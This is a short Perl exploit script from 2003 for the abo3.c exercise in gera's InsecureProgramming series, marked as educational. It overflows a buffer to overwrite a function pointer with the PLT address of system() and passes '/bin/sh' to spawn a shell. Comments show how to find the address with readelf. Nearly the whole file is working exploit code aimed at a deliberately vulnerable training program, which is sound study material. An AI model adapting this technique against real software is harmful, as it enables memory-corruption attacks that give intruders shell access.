#!/usr/bin/perl

#
# $Id: abo3-ex.pl,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
#
# abo3-ex.pl - abo3.c exploit, for educational purposes
# Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# See http://community.core-sdi.com/~gera/InsecureProgramming/
#
# This exploit changes the value of the function pointer void (*fn)(char*), 
# making it to point to the system() address in PLT (Procedure Linkage Table) 
# and supplying "/bin/sh" as argument. Use the following command to grab 
# the correct address for your system:
#
# $ readelf -a abo3 | grep system
# 0804963c  00000207 R_386_JUMP_SLOT   0804834c   system
#      2: 0804834c   729 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
#     62: 0804834c   729 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
#         ^^^^^^^^\__(this is the address you need)
#
# NOTE: on some systems sh(1), the command line interpreter used by the 
# system() function, drops privileges before executing the supplied commands.
# 

$system_addr = "\x4c\x83\x04\x08";	# system() address in PLT (backwards)
$buf = "$system_addr"x65;		# buffer length is 65*4=260

# run the vulnerable program
exec "./abo3", $buf, "/bin/sh";
